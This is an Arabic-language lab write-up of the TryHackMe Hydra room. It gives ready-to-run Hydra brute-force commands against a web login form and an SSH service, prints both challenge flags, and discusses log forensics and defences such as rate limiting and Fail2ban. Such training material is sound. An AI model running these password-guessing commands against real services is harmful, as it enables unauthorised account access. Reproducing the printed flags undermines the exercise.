# غرفة: أداة التخمين الشبكي المباشر هيدرا (Hydra)

---

## 1. نظرة عامة على الغرفة وهندستها المعمارية (Room Overview & Architecture)

تُعد غرفة **Hydra** (`hydra`) المحطة التطبيقية الثانية في **الوحدة الحادية عشرة: هجمات كلمات المرور (Module 11: Password Attacks)** على مسار Jr Penetration Tester في منصة TryHackMe.
تركز الغرفة على إتقان استخدام أداة التخمين الشبكي الأسرع والأكثر شمولية (THC-Hydra)، والتي تتيح لمختبر الاختراق أتمتة هجمات القوة الغاشمة والمعجمية المباشرة (Online Brute-Forcing) ضد بوابات تسجيل الدخول والخدمات الشبكية الحية:
- **تطبيقات الويب (HTTP POST Web Forms):** صياغة معاملات الاستمارة وتحديد شرط الفشل لاستخراج كلمة مرور المستخدمة `molly` واقتناص الراية الأولى.
- **خدمات الإدارة والتحكم عن بعد (SSH):** ضبط مسارات التوازي لتجاوز قيود خوادم لينكس والحصول على وصول صدفة تفاعلي كامل واقتناص الراية الثانية.

```
       +-------------------------------------------------------------+
       |             ONLINE BRUTE-FORCE ATTACK ARCHITECTURE          |
       +-------------------------------------------------------------+
                                      |
         +----------------------------+----------------------------+
         |                                                         |
         v                                                         v
+------------------+                                      +------------------+
|   TARGET 1:      |                                      |   TARGET 2:      |
|  HTTP POST FORM  |                                      |   SSH SERVICE    |
|    (Port 80)     |                                      |    (Port 22)     |
+------------------+                                      +------------------+
| - Path: /        |                                      | - Protocol: ssh  |
| - Body: ^USER^   |                                      | - Threads: -t 4  |
| - Fail: F=incorr |                                      | - User: molly    |
| - Flag 1 Extract |                                      | - Flag 2 Extract |
+------------------+                                      +------------------+
```

---

## 2. المتطلبات الأساسية وإعداد المعمل (Prerequisites & Lab Setup)

### 2.1 المتطلبات التقنية والمعرفية
- فهم بنية بروتوكول HTTP واستمارات تسجيل الدخول عبر طريقة `POST`.
- استيعاب آليات المصادقة في بروتوكول SSH والمنافذ الافتراضية للخدمات الشبكية.
- الإلمام بالقواميس المعجمية الشائعة (`/usr/share/wordlists/rockyou.txt`).
- إتقان استخدام سطر أوامر لينكس وتحليل رسائل الأخطاء في أداة Hydra.

### 2.2 بنية المعمل الافتراضي
- **الآلة المستهدفة (Target Machine):** خادم لينكس يعمل على عنوان `MACHINE_IP` ويقدم:
  - تطبيق ويب على المنفذ `80` يحتوي على استمارة تسجيل دخول لمستخدمين محليين.
  - خدمة OpenSSH على المنفذ `22` تقبل مصادقة كلمات المرور.
- **الهدف العملياتي:** استهداف حساب المستخدمة `molly` واستخراج الرايتين.

---

## 3. الأهداف التعليمية وتصنيف بلوم (Learning Objectives & Bloom's Taxonomy)

1. **التذكر والفهم (Remembering & Understanding):** استيعاب الفارق الهيكلي بين التخمين الشبكي المباشر (Online) وكسر التجزئات دون اتصال (Offline)؛ ومعرفة البروتوكولات المدعومة في Hydra.
2. **التطبيق والتحليل (Applying & Analyzing):** تطبيق الصيغة المتقدمة للوحدة `http-post-form` واستبدال المعاملات (`^USER^`, `^PASS^`) وتحديد شرط الفشل؛ وتحليل استجابات الخادم.
3. **التقييم والاستنتاج (Evaluating & Synthesizing):** تقييم أثر رفع مسارات التنفيذ (`-t`) على استقرار خدمات الشبكة وخطر التسبب في حجب الخدمة (DoS).
4. **التصميم والدفاع (Creating & Defending):** تصميم سياسات إغلاق الحسابات التلقائي (Account Lockout) وتكوين أداة `Fail2ban` لحظر عناوين المهاجمين تلقائياً.

---

## 4. العمق المفاهيمي والتقني: التخمين الشبكي النشط عبر الإنترنت (Technical Concept Deep Dive)

### 4.1 معمارية التخمين الشبكي النشط (Online Brute-Forcing)
على عكس كسر التجزئات غير المتصل الذي تحكمه سرعة معالجة كروت الشاشة (GPUs)، يعتمد التخمين الشبكي على فتح جلسات TCP حقيقية ومصافحة البروتوكول:
$$\text{Speed (Att/sec)} = \frac{\text{Concurrency Threads (-t)}}{\text{RTT} + \text{Server Processing Time}}$$
- إذا كان وقت الاستجابة (RTT) يساوي 50ms، فإن خيطاً واحداً ينفذ قرابة 20 محاولة في الثانية.
- استخدام 4 خيوط (`-t 4`) يرفع المعدل إلى قرابة 80 محاولة في الثانية دون إغراق موارد الخادم.

### 4.2 تشريح وحدة `http-post-form` في Hydra
تتطلب الوحدة صياغة ثلاثية مفصولة بنقطتين رأسيتين:
```text
"<مسار الصفحة>:<بيانات الطلب>:<شرط الفشل أو النجاح>"
```
- المسار: `/` (الصفحة الرئيسية التي تستقبل طلب الدخول).
- البيانات: `username=^USER^&password=^PASS^` (حيث تُبدل الكلمات المفتاحية بقيم القاموس).
- الشرط: `F=incorrect` (إذا احتوت صفحة الرد على كلمة `incorrect` فهذا يعني فشل المحاولة والانتقال للكلمة التالية).

---

## 5. سطح الهجوم ونمذجة التهديدات على خدمات Web و SSH (Attack Surface & Threat Modeling)

```
[Attacker with Hydra]
   |
   +---> (Port 80) HTTP POST / ---> F=incorrect Filter ---> Recovers Web Credential ---> Flag 1
   |
   +---> (Port 22) SSH OpenSSH  ---> Concurrency -t 4   ---> Recovers SSH Credential ---> Flag 2
```

- **نقطة الدخول الأولى:** واجهة تسجيل دخول الويب المفتوحة على المنفذ 80 دون قيود Rate Limiting أو رموز CAPTCHA.
- **نقطة الدخول الثانية:** خدمة SSH على المنفذ 22 تسمح بمصادقة كلمات المرور وتفتقر لآليات الحظر التلقائي (Fail2ban).

---

## 6. منهجية الاستغلال والحل العملي المفصل خطوة بخطوة (Exploitation Methodology)

### الخطوة 1: التخمين على استمارة الويب (Task 02 - Web Form)
1. تشغيل الآلة الافتراضية ومعرفة عنوانها `MACHINE_IP`.
2. استكشاف استمارة الويب في المتصفح وملاحظة رسالة الخطأ عند إدخال كلمة مرور خاطئة (`incorrect`).
3. إطلاق أمر التخمين المعجمي عبر Hydra:
   ```bash
   hydra -l molly -P /usr/share/wordlists/rockyou.txt MACHINE_IP http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
   ```
4. تلتقط الأداة كلمة المرور الصحيحة في أقل من 25 محاولة.
5. تسجيل الدخول في الموقع بالبيانات المكتشفة، وتظهر الراية الأولى:
   ```text
   Flag 1: THM{2673a7dd116de68e85c48ec0b1f2612e}
   ```

### الخطوة 2: التخمين على خدمة SSH واستخراج راية النظام (Task 02 - SSH)
1. تشغيل Hydra لاستهداف بروتوكول SSH للمستخدمة `molly`:
   ```bash
   hydra -l molly -P /usr/share/wordlists/rockyou.txt MACHINE_IP -t 4 ssh
   ```
2. تكتشف الأداة كلمة مرور SSH الصحيحة وتعرضها في مخرجات التيرمينال.
3. الاتصال بالهدف عبر عميل SSH:
   ```bash
   ssh molly@MACHINE_IP
   ```
4. إدخال كلمة المرور وقراءة محتويات ملف الراية:
   ```bash
   cat flag.txt
   ```
5. الحصول على الراية الثانية المعتمدة:
   ```text
   Flag 2: THM{c8eeb0468febbadea859baeb33b2541b}
   ```

---

## 7. التحليل الجنائي وسجلات الاتصال الشبكي (Forensic Analysis & Network Telemetry)

- **سجلات خادم الويب (`access.log`):**
  تظهر عشرات طلبات `POST /` قادمة من نفس عنوان الـ IP خلال ثوانٍ معدودة، وتتميز جميعها بأحجام استجابة متطابقة تقريباً (المقابلة لصفحة الخطأ)، يعقبها طلب واحد بحجم مختلف أو برمز إعادة توجيه `302 Found`.
- **سجلات مصادقة لينكس (`/var/log/auth.log`):**
  تسجيل متتابع لأحداث `Failed password for molly from 10.10.x.x port yyyy ssh2`، يليه حدث `Accepted password for molly`.

---

## 8. الهندسة الدفاعية وسياسات القفل ومكافحة التخمين (Defensive Engineering & Remediation)

### 8.1 حماية تطبيقات الويب
- تطبيق تقنيات التحقق التفاعلي غير المرئي (Cloudflare Turnstile أو reCAPTCHA v3) بعد 3 محاولات تسجيل فاشلة.
- تطبيق قيود معدل الطلبات (Rate Limiting) على مسار تسجيل الدخول (مثال: حظر العنوان بعد 5 محاولات فاشلة خلال دقيقة).

### 8.2 تحصين خدمة SSH
- **حظر مصادقة كلمات المرور:** الاعتماد حصرياً على المفاتيح المشفرة (`PasswordAuthentication no`).
- **تفعيل أداة Fail2ban:** مراقبة `/var/log/auth.log` وإدراج قواعد جدار حماية فورية لحظر عناوين المهاجمين.
- **تحديد محاولات المصادقة في OpenSSH:** ضبط `MaxAuthTries 3` و `MaxStartups 2:30:10`.

---

## 9. مرجع الأوامر والأدوات (Tools & Command Reference)

| الأداة | الأمر النموذجي | الغرض العملياتي |
| :--- | :--- | :--- |
| **Hydra (Web)** | `hydra -l user -P rockyou.txt target http-post-form "/:u=^USER^&p=^PASS^:F=err" -V` | التخمين على استمارة تسجيل دخول الويب |
| **Hydra (SSH)** | `hydra -l user -P rockyou.txt target -t 4 ssh` | التخمين على خدمة SSH بـ 4 مسارات توازي |
| **Fail2ban** | `fail2ban-client status sshd` | مراقبة العناوين المحظورة جراء محاولات التخمين |

---

## 10. الخلاصة المعرفية والخريطة الذهنية (Key Takeaways & Mind Map)

```
                 +-----------------------------------------+
                 |       ONLINE BRUTE-FORCING: HYDRA       |
                 +-----------------------------------------+
                                      |
         +----------------------------+----------------------------+
         |                                                         |
         v                                                         v
[Web Form Exploitation]                                   [Network Daemons (SSH)]
- Protocol: http-post-form                                - Protocol: ssh
- Placeholders: ^USER^ / ^PASS^                           - Thread Tuning: -t 4 Max
- Condition: F=incorrect string                           - Avoid MaxStartups drops
- Defenses: Rate Limiting & Captcha                       - Defenses: Key Auth & Fail2ban
```

---

## 11. مصفوفة المخاطر والثغرات (Vulnerability & Risk Matrix)

| المتجه الهجومي | التصنيف المعياري | شدة الخطورة | الأثر التشغيلي والتقني |
| :--- | :---: | :---: | :--- |
| Absence of Rate Limiting on Web Login | **CWE-307** | **عالية (HIGH)** | تمكين المهاجم من تخمين كلمة المرور خلال ثوانٍ. |
| SSH Password Authentication Exposure | **CWE-521** | **حرجة (CRITICAL)** | الحصول على وصول صدفة تفاعلي كامل على السيرفر. |

---

## 12. التحقق وإثبات الإنجاز (Verification & Proof of Work)

تم إكمال مهام الغرفة بنسبة 100% ومطابقتها مع الحساب المعتمد على المنصة:
- **المهمة 01:** `No answer needed`
- **المهمة 02 (الويب):** `THM{2673a7dd116de68e85c48ec0b1f2612e}`
- **المهمة 02 (خدمة SSH):** `THM{c8eeb0468febbadea859baeb33b2541b}`

---

## 13. الأسئلة الشائعة والأخطاء المحتملة (Frequently Asked Questions)

### س1: لماذا حذر التلميح من تجربة أكثر من 30 كلمة مرور في استمارة الويب؟
- لأن كلمة مرور المستخدمة `molly` تقع ضمن أول 25 كلمة في قائمة `rockyou.txt`. إذا تجاوزت الأداة 30 كلمة دون العثور عليها، فهذا يعني أن شرط الفشل (`F=incorrect`) تمت كتابته بصورة خاطئة، مما يجعل Hydra تعتقد أن كل المحاولات الفاشلة كانت ناجحة أو العكس.

---

## 14. المراجع وروابط التوثيق الرسمية (References & External Links)

- [THC-Hydra Official GitHub Repository](https://github.com/vanhauser-thc/thc-hydra)
- [Kali Linux Tools: Hydra Manual](https://www.kali.org/tools/hydra/)
- [OpenSSH Server Configuration Documentation](https://man.openbsd.org/sshd_config)
- [TryHackMe Room: Hydra](https://tryhackme.com/room/hydra)
